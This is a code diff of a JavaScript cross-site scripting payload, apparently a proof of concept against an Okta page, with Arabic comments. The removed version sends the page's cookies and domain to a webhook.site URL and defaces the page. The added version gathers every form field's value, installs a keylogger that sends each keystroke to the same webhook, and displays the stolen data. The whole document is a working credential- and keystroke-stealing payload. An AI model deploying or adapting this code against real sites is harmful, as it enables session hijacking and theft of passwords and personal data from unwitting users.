@@ -1,23 +1,32 @@
-// 💥 ADVANCED XSS PAYLOAD
 (function() {
-  console.log("🚀 Advanced Payload Started");
+  console.log("🚀 Advanced XSS + Extraction Started");
 
-  // إرسال معلومات DOM و Cookie إلى Webhook
-  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/xss?info=" 
-        + encodeURIComponent(document.domain + " | " + document.cookie));
+  // 🧠 التقاط محتوى جميع الحقول الحساسة
+  const fields = document.querySelectorAll("input, textarea, select");
+  let fieldData = [];
 
-  // تعديل العنوان والعناصر الظاهرة
-  document.title = "☠️ XSS OWNED - Okta POC";
-  document.body.style.background = "#000";
-  document.body.style.color = "#0f0";
-  document.body.innerHTML = "<h1 style='font-size:3em;'>🔥 System Compromised</h1><p>XSS executed by Dr. Zaid</p>";
+  fields.forEach(el => {
+    let name = el.name || el.id || "unnamed";
+    let type = el.type || el.tagName.toLowerCase();
+    let value = el.value || "(empty)";
+    fieldData.push(`${type}[${name}]=${value}`);
+  });
 
-  // إدراج سكربت إضافي (لأي مرحلة لاحقة)
-  var s = document.createElement('script');
-  s.src = "https://cdn.jsdelivr.net/npm/marked/marked.min.js";
-  document.head.appendChild(s);
+  // 🔐 تشغيل Keylogger على كافة الحقول
+  document.addEventListener("keydown", function(e) {
+    fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/keylog?key=" + encodeURIComponent(e.key));
+  });
 
-  // تأكيد بصري
-  alert("☠️ ADVANCED XSS TRIGGERED!");
-  console.log("✅ Payload Complete");
+  // 📦 إرسال البيانات إلى Webhook
+  fetch("https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/xssfields?data=" + encodeURIComponent(fieldData.join("&")));
+
+  // 🔥 تعديل بصري للموقع لإثبات التنفيذ
+  document.title = "XSS ⚠️ Breach Detected";
+  document.body.style.background = "#111";
+  document.body.style.color = "#f00";
+  document.body.innerHTML = `<h1 style='font-size:2em;'>🛑 Data Extracted by Dr. Zaid</h1><p>${fieldData.join("<br>")}</p>`;
+
+  // ✅ تأكيد
+  alert("✅ Field data sent, keylogger active.");
+  console.log("✔️ Extraction and keylogger initialized");
 })();
